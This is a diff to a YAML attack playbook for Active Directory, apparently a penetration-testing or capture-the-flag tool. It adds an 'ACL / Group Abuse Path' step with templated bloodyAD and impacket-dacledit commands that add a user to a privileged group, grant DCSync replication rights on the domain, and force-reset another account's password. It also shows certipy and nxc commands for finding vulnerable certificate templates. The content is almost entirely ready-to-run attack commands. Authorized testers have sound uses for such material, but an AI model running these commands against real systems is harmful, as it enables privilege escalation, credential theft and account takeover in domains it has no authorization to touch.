@@ -126,10 +126,20 @@ steps:
     check:
       bloodhound_data: true
 
+  - id: acl-abuse
+    name: "ACL / Group Abuse Path"
+    phase: privilege-escalation
+    description: "Exploit BloodHound-identified ACL paths — Account Operators, GenericAll, WriteDacl, GenericWrite"
+    commands:
+      - "# Review BloodHound for: Account Operators, GenericAll, GenericWrite, WriteDacl, ForceChangePassword"
+      - "bloodyAD -u {USER} -p '{PASSWORD}' -d {DOMAIN} --host {IP} add groupMember 'TARGET_GROUP' {USER}"
+      - "impacket-dacledit -action write -rights DCSync -principal {USER} -target-dn 'DC=DOMAIN,DC=LOCAL' {DOMAIN}/{USER}:'{PASSWORD}'"
+      - "bloodyAD -u {USER} -p '{PASSWORD}' -d {DOMAIN} --host {IP} set password TARGET 'NewPass123!'"
+
   - id: adcs-enum
     name: "ADCS Enumeration"
     phase: discovery
-    description: "Find vulnerable Certificate Templates (ESC1-ESC14)"
+    description: "Find vulnerable Certificate Templates (ESC1-ESC16)"
     commands:
       - "certipy find -u {USER}@{DOMAIN} -p '{PASSWORD}' -dc-ip {IP} -vulnerable -stdout"
       - "nxc ldap {IP} -u {USER} -p '{PASSWORD}' -M adcs"
